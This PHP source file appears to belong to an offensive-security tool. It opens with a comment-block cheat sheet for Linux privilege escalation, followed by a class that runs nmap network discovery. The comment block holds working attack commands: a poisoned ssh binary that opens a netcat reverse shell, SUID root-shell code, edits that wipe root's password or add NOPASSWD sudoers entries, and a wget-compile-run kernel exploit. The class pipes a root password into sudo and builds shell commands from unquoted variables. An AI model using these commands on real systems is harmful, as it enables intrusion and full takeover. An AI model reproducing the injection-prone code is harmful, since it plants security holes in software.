<?php


/*
https://github.com/0x00-0x00/ShellPop
https://ired.team/offensive-security-experiments/offensive-security-cheetsheets

https://www.hackingarticles.in/penetration-testing/

// Docker priv escal 
 */
/*
 Which of the following commands shows you all of the network services running on Windows-based servers?
 A. Net start
 B. Net use
 C. Net Session
 D. Net share
 Correct Answer: A


 hardcode MAC Address
 C:\> arp -s 192.168.1.130 AA:BB:CC:DD:EE:FF
 
 
 A passive OS fingerprinting tool is just a sniffer and some intelligence to analyze the packets gathered by the sniffer. It’s a passive fingerprinter, because it sends
no traffic on the network; it just receives packets
using a built-in sniffer.



find $(pwd) -type f : chemin absolu 
find . -type f : chemin relatif 







if you can just change PATH, the following will add a poisoned ssh binary:

set PATH="/tmp:/usr/local/bin:/usr/bin:/bin"
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.1 4444 >/tmp/f" >> /tmp/ssh
chmod +x ssh

Generating SUID C Shell for /bin/sh

int main(void){
setresuid(0, 0, 0);
system("/bin/sh");
}

Without interactive shell

$ echo -e '#include <stdio.h>\n#include <sys/types.h>\n#include <unistd.h>\n\nint main(void){\n\tsetuid(0);\n\tsetgid(0);\n\tsystem("/bin/sh");\n}' > setuid.c

If you can get root to execute anything, the following will change a binary owner to him and set the SUID flag:

$ chown root:root /tmp/setuid;chmod 4777 /tmp/setuid;

If /etc/passwd has incorrect permissions, you can root:

$ echo 'root::0:0:root:/root:/bin/sh' > /etc/passwd; su

Add user www-data to sudoers with no password

$ echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update

If you can sudo chmod:

$echo -e '#include <stdio.h>\n#include <sys/types.h>\n#include <unistd.h>\n\nint main(void){\n\tsetuid(0);\n\tsetgid(0);\n\tsystem("/bin/sh");\n}' > setuid.c $ sudo chown root:root /tmp/setuid; sudo chmod 4777 /tmp/setuid; /tmp/setuid

Wildcard injection if there is a cron with a wildcard in the command line, you can create a file, whose name will be passed as an argument to the cron task, For more info:

https://www.sans.org/reading-room/whitepapers/testing/attack-defend-linux-privilege-escalation-techniques-2016-37562

compile exploit fix error

$ gcc 9545.c -o 9545 -Wl,--hash-style=both

Find other uses in the system

$id; who; w; last; cat /etc/passwd | cut -d: -f1; echo 'sudoers:'; cat /etc/sudoers; sudo -l

World readable/writable files:

$ echo "world-writeable folders"; find / -writable -type d 2>/dev/null; echo "world-writeable folders"; find / -perm -222 -type d 2>/dev/null; echo "world-writeable folders"; find / -perm -o w -type d 2>/dev/null; echo "world-executable folders"; find / -perm -o x -type d 2>/dev/null; echo "world-writeable & executable folders"; find / \( -perm -o w -perm -o x \) -type d 2>/dev/null;

Find world-readable files:

$ find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print

Find nobody owned files

$ find /dir -xdev \( -nouser -o -nogroup \) -print

Add user to sudoers in python.

#!/usr/bin/env python
import os
import sys
try:
os.system('echo "username ALL=(ALL:ALL) ALL" >> /etc/sudoers')
except:
sys.exit()

Ring0 kernel exploit for 2.3/2.4

wget http://downloads.securityfocus.com/vulnerabilities/exploits/36038-6.c; gcc 36038-6.c -m32 -o ring0; chmod +x ring0; ./ring0

Inspect web traffic

$ tcpdump tcp port 80 -w output.pcap -i eth0



http://blog.sevagas.com/IMG/pdf/exploiting_capabilities_the_dark_side.pdf
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
https://bitvijays.github.io/LFC-VulnerableMachines.html
https://itblogr.com/hack-the-box-walkthrough-solutions/


*/



class LAN extends SERVICE4COM{

    var $stream ;
	var $lan2domain;
	var $lan2ip;
	var $lan2workgroup ;
	var $network_range;
	var $network_eth_lan ;
	var $network_ip_lan ;
	var $network_dns;
	var $network_gw ;
	var $network_ip_wan ;
	
	var $path_webbrowser_cli ;
	var $path_compiler_c ;
	var $path_strings ;
	var $path_snifer ;
	var $path_socat ;
	var $env_path_str ;

	
	
	



	
	
	

	
	
	public function __construct($eth,$domain,$ip,$port,$protocol,$stream) {
	    parent::__construct($eth,$domain,$ip,$port,$protocol);


	    // 

	    if (!is_resource($stream)) {
	        $this->log2error('LAN: Socket Failed',__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
	        exit();
	    }
	    if (is_resource($stream)) {
	        $this->stream = $stream;	
	        
	        //var_dump($this->stream);echo get_resource_type($this->stream);$this->pause();
	        //var_dump(stream_get_transports());var_dump(stream_get_filters());$this->pause();
	    }
	    
	   
	   
	}

	


    
	  
	
	
	

	
	
	    
	public function lan2dot(){
		$this->ssTitre(__FUNCTION__);
	}
	
	public function lan2router(){
	    $this->ssTitre(__FUNCTION__);
	    $query = "cisco-ocs  $this->lan2ip_range -e $this->eth_lan  ";
	    return $this->req2BD(__FUNCTION__,__CLASS__,"domain = '$this->lan2domain' AND lan2range = '$this->lan2ip_range'",$query);
	}
	
	public function lan2mac(){
		$this->ssTitre(__FUNCTION__);
		$query = "echo '$this->root_passwd' | sudo -S nmap -sn  $this->lan2ip_range -e $this->eth_lan | grep 'MAC' -B3 ";
return $this->req2BD(__FUNCTION__,__CLASS__,"domain = '$this->lan2domain' AND lan2range = '$this->lan2ip_range'",$query);
	}
	
	public function lan2hosts(){
		$this->ssTitre(__FUNCTION__);
		$query = "echo '".$this->lan2mac()."' | grep -Po \"\([0-9a-zA-Z_-]{1,}\.[0-9a-zA-Z_-]{1,}\)\" ";
return $this->req2BD(__FUNCTION__,__CLASS__,"domain = '$this->lan2domain' AND lan2range = '$this->lan2ip_range'",$query);
	}
	
	public function lan2live(){
		$this->ssTitre(__FUNCTION__);
		$query = "echo '".$this->lan2mac()."' | grep -Po \"[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\" ";
return $this->req2BD(__FUNCTION__,__CLASS__,"domain = '$this->lan2domain' AND lan2range = '$this->lan2ip_range'",$query);
	}
	
	
	
	
	
	
	public function lan2scan4idle(){
	    $this->ssTitre(__FUNCTION__);
	    $query = "echo '$this->root_passwd' | sudo -S nmap --script ipidseq -s$this->protocol -p $this->port $this->ip -e $this->eth"; // [port]
	    return $this->req_ret_str($query);
	}
	
	
	
	
	
	
	
		
	
}
?>